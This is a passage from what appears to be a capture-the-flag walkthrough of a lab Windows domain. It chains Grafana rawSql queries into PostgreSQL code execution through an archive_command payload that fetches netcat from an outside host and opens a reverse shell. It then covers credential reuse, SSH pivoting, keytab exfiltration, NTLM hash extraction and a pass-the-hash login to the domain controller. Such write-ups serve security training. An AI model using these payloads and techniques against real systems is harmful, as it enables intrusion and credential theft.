modifying entry "CN=Carlos Olivera,OU=IT Staff,OU=Employees,DC=umbrella,DC=htb"
modify complete

└───# ldapsearch -H ldap://dc01.umbrella.htb -b 'DC=umbrella,DC=htb' -D "CN=CARLOS OLIVERA,OU=IT STAFF,OU=EMPLOYEES,DC=UMBRELLA,DC=HTB" -w "SuperP@ss" "(sAMAccountName=colivera)" | grep mail
mail: aredfield@umbrella.htb
```

Now if we refresh our page we should be logged in as Alice Redfield.  We see a folder named `Grafana` that was shared with us that includes two files:
* `grafana_dashboard.json` A Grafana dashboard indicating there is a PostgreSQL data source.
* `URGENT.pdf` Notification about a viral outbreak with a link to a Grafana URL and dashboard as well as an API key.

URL : http://prd23-grafana.umbrella.htb
Dashboard: http://prd23-grafana.umbrella.htb/dashboard/snapshot/NV94t5GnSYoeWERV8gj0yQdeU1lKR7Pe
API Key : `glsa_KEUmkI0YaJqHvP1Bx6GHYNk5cssdj51T_4e581a63`

![](Umbrella.assets/foothold6.png)

We can see some of the PostgreSQL queries in the dashboard configuration so let's do some research around PostgreSQL.  Grafana is also <a href="https://community.grafana.com/t/sql-injection-in-api-tsdb-query-in-grafana/29713">known to allow RawSql queries which can lead to SQL injection</a>.  Also in this link we can see an example SQL query via the API.

If we Google: `pentesting postgresql` we're linked <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql">here</a>
In this blog post there are sections related to RCE via configuration files which has a section specific to <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-with-archive_command">RCE with archive_command</a> which as a link to another article that demonstrates the <a href="https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3">attack path</a>

Let's start by looking up how to make <a href="https://grafana.com/docs/grafana/latest/developers/http_api/">Grafana API requests</a> and build out a test query to see what we can enumerate.  We can also use the <a href="https://community.grafana.com/t/sql-injection-in-api-tsdb-query-in-grafana/29713">example</a> from the links above to adapt our initial test payload by using some of the known data from `grafana_dashboard.json`.

```json
POST /api/ds/query HTTP/1.1
Host: prd23-grafana.umbrella.htb
Upgrade-Insecure-Requests: 1
Authorization: Bearer glsa_KEUmkI0YaJqHvP1Bx6GHYNk5cssdj51T_4e581a63
Connection: close
Content-Type: application/json
Content-Length: 429

{"queries": [
	{
	"refId": "A",
	"intervalMs": 86400000,
	"maxDataPoints": 1092,
	"datasource": { "type": "postgres",
	            "uid": "d251a4a7-1599-4e9f-bb43-58599d6cd6fb"
	          },
	"rawSql": "SELECT e.first_name, e.last_name, sa.access_level, sa.location, sa.access_date\r\nFROM Employees e\r\nJOIN Security_Access sa ON e.employee_id = sa.employee_id\r\nORDER BY sa.access_date DESC;\r\n",
	"format": "table"
		}
	]
}
```

With this we'll get a successful response and we can now follow along with the <a href="https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3">attack path</a> that we found.  Let's enumerate some basic information first:
* `select current_database()`: `umbrella`
* `select current_user`: `rnd_dbuser`
* `select current_setting('is_superuser')`: `on`
So we know we're a `superuser` which is good news so far!  Now lets switch to `sqlmap` so its easier to execute queries.  We can save our current Burp request to save time:
`sqlmap -r grafana.req --fresh-queries --batch --dbms postgresql -D umbrella --sql-shell`

Now let's enumerate what we can do with our account, which indicates all we can do are `SELECT` statements.  Luckily this is inline with our current attack path where we can achieve RCE with just `SELECT` queries.
```java
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE grantee = 'rnd_dbuser'

[*] rnd_dbuser, public, biohazard_incidents, SELECT
[*] rnd_dbuser, public, employees, SELECT
[*] rnd_dbuser, public, experiment_logs, SELECT
[*] rnd_dbuser, public, research_projects, SELECT
[*] rnd_dbuser, public, security_access, SELECT
[*] rnd_dbuser, public, virus_strains, SELECT
```

Continuing on let's validate our current WAL status:
```java
sql-shell> SELECT current_setting('archive_mode')
SELECT current_setting('archive_mode'): 'on'

sql-shell> SELECT current_setting('archive_command')
[23:49:31] [INFO] retrieved: ''
```

WAL is enabled! Now we need to exfil `postgresql.conf` - we can locate this file with a quick Google search and enumerating our version which is `16`.  So our location will be: `
`C:\Program Files\PostgreSQL\16\data\postgresql.conf`

`Note: It is best to perform this part with Burpsuite as sqlmap seems to have character response limits`
```java
Request:
{"queries": [
	{
	"refId": "A",
	"intervalMs": 86400000,
	"maxDataPoints": 1092,
	"datasource": { "type": "postgres",
	            "uid": "d251a4a7-1599-4e9f-bb43-58599d6cd6fb"
	          },
	"rawSql": "SELECT lo_import('C:/Program Files/PostgreSQL/16/data/postgresql.conf')",
	"format": "table"
		}
	]
}

Response:
{"results":{"A":{"status":200,"frames":[{"schema":{"refId":"A","meta":{"typeVersion":[0,0],"executedQueryString":"SELECT lo_import('C:/Program Files/PostgreSQL/16/data/postgresql.conf')"},"fields":[{"name":"lo_import","type":"string","typeInfo":{"frame":"string","nullable":true}}]},"data":{"values":[]("17949")}}]}}}
```

Now we can take the `lo_import` ID to retrieve the configuration file:
```java
Request:
{"queries": [
	{
	"refId": "A",
	"intervalMs": 86400000,
	"maxDataPoints": 1092,
	"datasource": { "type": "postgres",
	            "uid": "d251a4a7-1599-4e9f-bb43-58599d6cd6fb"
	          },
	"rawSql": "SELECT encode(lo_get(17949), 'escape')",
	"format": "table"
		}
	]
}

```

The response will contain the contents of `postgresql.conf`, but we'll need to clean up all `\t` `\r` and `\n`, and add an `archive_command` payload.  Once completed we'll need to base64 encode it before uploading again.

The payload in this example is:
`archive_command = 'curl.exe http://10.10.14.46:8000/nc64.exe -o c:\\windows\\temp\\nc64.exe && c:\\windows\\temp\\nc64.exe -e cmd.exe 10.10.14.46 10001'

Summarized upload steps...
```java
Request 1:
"rawSql": "SELECT lo_from_bytea(12345, decode('IyAtLS0tLS0tLS0tLS0tLS0tLS<...snip...>ZvciBleHRlbnNpb25zIGhlcmU=', 'base64'))"

Request 2:
"rawSql": "SELECT lo_export(12345, 'postgresql.conf')",
```

Now we can issue a config reload command then verify it.  If all looks good will trigger the payload by forcing PostgreSQL to switch to a new WAL file:
```bash
sql-shell> SELECT pg_reload_conf()
SELECT pg_reload_conf(): 'true'

sql-shell> SELECT current_setting('archive_command')
SELECT current_setting('archive_command'): 'curl.exe http://10.10.14.46:8000/nc64.exe -o c:\\\\windows\\\\temp\\\\nc64.exe \\u0026\\u0026 c:\\\\windows\\\\temp\\\\nc64.exe -e cmd.exe 10.10.14.46 10001'

sql-shell> SELECT pg_switch_wal()
```

If all went well we should have a successful shell.
`Note: Using netcat is unstable once the WAL switching process completes and another backgrounded shell must be executed.`
```bash
listening on [any] 10001 ...
connect to [10.10.14.46] from (UNKNOWN) [10.129.229.149] 57410
Microsoft Windows [Version 10.0.20348.2031]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\PostgreSQL\16\data>
```

```bash
PS C:\Program Files\PostgreSQL\16\data> whoami
nt authority\network service

PS C:\Program Files\PostgreSQL\16\data> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description              State
======================= ======================== =======
SeChangeNotifyPrivilege Bypass traverse checking Enabled
```
# Lateral Movement

We can start with some basic enumeration, but we know that we were just dealing with a Grafana implementation so lets look further into that. 
Looking at the configuration of Grafana we can see that there is an `ldap.toml` file.  Examining the contents of this file we find credentials for LDAP authentication. This is inline with the `URGENT.pdf` file that we discovered earlier.

```bash
# Search user bind dn
bind_dn = "CN=Jill Valentine,OU=Virology,OU=Employees,DC=umbrella,DC=htb"
# Search user bind password
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
bind_password = 'Z2BgbeQSrH1L!'
# We recommend using variable expansion for the bind_password, for more info https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/#variable-expansion
# bind_password = '$__env{LDAP_BIND_PASSWORD}'
```

We can quickly test these credentials against Grafana to verify they are functional, however we can see that `Jill Valentine` is not part of any special groups other than those related to Nextcloud and Grafana so at this time we cannot use WinRM to access the server.

Moving on with enumeration we can also discover that there is a Hyper-V instance attached to this server as well.

```powershell
PS C:\Program Files\GrafanaLabs\grafana\conf> ipconfig /all

Ethernet adapter vEthernet (vSwitchInternal):

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Hyper-V Virtual Ethernet Adapter
   Physical Address. . . . . . . . . : 00-15-5D-32-18-00
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 172.16.20.1(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

We can see in our Bloodhound data that there is a computer object named `prd23-nextcloud` which means that it's domain joined.  Pinging this server reveals that this is the Hyper-V instance in the additional subnet above; furthermore the ping TTL also indicates its a Linux instance so we can try logging in with SSH.

`Note: Because this is a Windows Server 2022 server an ssh client is already built-in which eliminates the need to forward any ports`
```powershell
PS C:\Program Files\GrafanaLabs\grafana\conf> ssh -l jvalentine@umbrella.htb 172.16.20.20
<...snip...>
jvalentine@umbrella.htb@172.16.20.20's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-87-generic x86_64)

<...snip...>

Last login: Wed Oct 25 12:28:03 2023 from 172.16.20.1
jvalentine@umbrella.htb@prd23-nextcloud:~$ 
```

And here we can see the user flag.
# Privilege Escalation

Basic enumeration here shows we can immediately escalate to root with `sudo`
```bash
jvalentine@umbrella.htb@prd23-nextcloud:~$ sudo -l
[sudo] password for jvalentine@umbrella.htb:
Matching Defaults entries for jvalentine@umbrella.htb on prd23-nextcloud:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jvalentine@umbrella.htb may run the following commands on prd23-nextcloud:
    (ALL : ALL) ALL
```

Looking through `/home` we can find an additional user home directory `Alex Wesker` who is part of the `Domain Admins` group.  We can also see a hidden directory for `.keytabs` which contains a keytab for this users account most likely used to authenticate via Kerberos.

```bash
root@prd23-nextcloud:/home/awesker@umbrella.htb# ls -lah
<...snip...>
drwxr-xr-x 2 awesker@umbrella.htb domain users@umbrella.htb 4.0K Oct 25 19:01 .keytabs
-rw-r--r-- 1 awesker@umbrella.htb domain users@umbrella.htb  807 Oct 25 12:21 .profile

root@prd23-nextcloud:/home/awesker@umbrella.htb# cd .keytabs/
root@prd23-nextcloud:/home/awesker@umbrella.htb/.keytabs# ls
awesker.keytab

root@prd23-nextcloud:/home/awesker@umbrella.htb/.keytabs$ strings awesker.keytab 
UMBRELLA.HTB
awesker
root@prd23-nextcloud:/home/awesker@umbrella.htb/.keytabs# 
```

Let's research what we can do with this.  If we search for something simple like `keytab exploit` on Google we'll find <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory">a hacktricks blog post</a> that also mentions how to <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory#extract-accounts-from-etc-krb5.keytab">how to extract credentials from a keytab file</a>

We can use <a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a> to do this.  We'll base64 encode the file to exfil it.
```bash
root@prd23-nextcloud:/home/awesker@umbrella.htb/.keytabs# cat awesker.keytab | base64 -w 0; echo
BQIAAAA6AAEADFVNQlJFTExBLkhUQgAHYXdlc2tlcgAAAAFlOUzSAwAXABBZtKLw4uzZ8zf6nVQ4vx8r
```

And now we can attempt to extract the credentials:
```bash
└───# git clone https://github.com/sosdave/KeyTabExtract.git
Cloning into 'KeyTabExtract'...
remote: Enumerating objects: 31, done.
remote: Counting objects: 100% (2/2), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 31 (delta 0), reused 1 (delta 0), pack-reused 29
Receiving objects: 100% (31/31), 6.73 KiB | 6.73 MiB/s, done.
Resolving deltas: 100% (12/12), done.

└───# echo BQIAAAA6AAEADFVNQlJFTExBLkhUQgAHYXdlc2tlcgAAAAFlOUzSAwAXABBZtKLw4uzZ8zf6nVQ4vx8rAAAAAw== | base64 -d > awesker.keytab 

└───# python3 KeyTabExtract/keytabextract.py awesker.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[!] Unable to identify any AES256-CTS-HMAC-SHA1 hashes.
[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
[+] Keytab File successfully imported.
	REALM : UMBRELLA.HTB
	SERVICE PRINCIPAL : awesker/
	NTLM HASH : 59b4a2f0e2ecd9f337fa9d5438bf1f2b
```

Now that we have an NTLM hash for a Domain Admin we can use WinRM to access the DC and get the Administrator flag.
```powershell
└───# evil-winrm -i dc01.umbrella.htb -u awesker -H 59b4a2f0e2ecd9f337fa9d5438bf1f2b

Evil-WinRM shell v3.4

<...snip...>

*Evil-WinRM* PS C:\Users\awesker\Documents> dir c:\users\administrator\desktop\root.txt


    Directory: C:\users\administrator\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/24/2023   3:53 PM              0 root.txt
```
